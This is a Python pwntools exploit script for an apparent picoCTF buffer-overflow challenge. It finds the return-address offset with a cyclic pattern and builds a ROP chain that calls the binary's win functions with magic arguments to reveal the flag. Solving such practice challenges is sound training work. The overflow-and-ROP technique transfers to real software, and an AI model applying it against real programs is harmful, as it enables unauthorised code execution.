import os
os.environ['TMPDIR'] = os.path.join(os.environ['HOME'], 'tmp')

import pwn

remote_binary = "/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln"
remote_binary = "./vuln"

BUF_LEN = 64
pr = pwn.process(remote_binary)

def detect_segfault():
    """
    Input result of `pwn.cyclic(128,n=8)`, we got a segfault. By checking the stack, we have
    (gdb) info stack
    #0  0x00000000004008cd in vuln ()
    #1  0x616161616161616a in ?? ()
    #2  0x616161616161616b in ?? ()
    #3  0x616161616161616c in ?? ()
    #4  0x616161616161616d in ?? ()
    #5  0x616161616161616e in ?? ()
    #6  0x616161616161616f in ?? ()
    #7  0x6161616161616170 in ?? ()
    #8  0x0000000000000000 in ?? ()
    """
    ofs = pwn.cyclic_find(pwn.p64(0x616161616161616a),n=8) # 72

    """
    A trick due to old code haven't been removed

    payload = b'A'*ofs + pwn.p64(pwn.ELF(remote_binary, False).sym["main"])
    pr.writelineafter("Welcome to 64-bit. Can you match these numbers?\n", payload);

    payload = b'A'*ofs + pwn.p64(pwn.ELF(remote_binary, False).sym["flag"])
    pr.writelineafter("Welcome to 64-bit. Can you match these numbers?\n", payload);
    """

    for _ in range(0):
        payload = b'A'*ofs + pwn.p64(pwn.ELF(remote_binary, False).sym["main"])
        pr.writelineafter("Welcome to 64-bit. Can you match these numbers?\n", payload);

    """
    According to the conditions we need to make `win1` and `win2` true by calling `win_fn1` and `win_fn2` before `win_fn`
    """
    payload = b"A"*ofs + build_rop()
    print("payload:\n", payload)
    pr.writelineafter("Welcome to 64-bit. Can you match these numbers?\n", payload);
    rsp = pr.readall(timeout=0.5)

    print('ofs:', ofs);print('rsp:', rsp)
    if rsp and "pico" in rsp.decode().lower():
        print(rsp)

def build_rop():
    rop = pwn.ROP(remote_binary)
    rop.win_fn1(0xDEADBEEF)
    rop.win_fn2(0xBAADCAFE,0xCAFEBABE,0xABADBABE)
    rop.win_fn()

    return rop.chain()

detect_segfault()
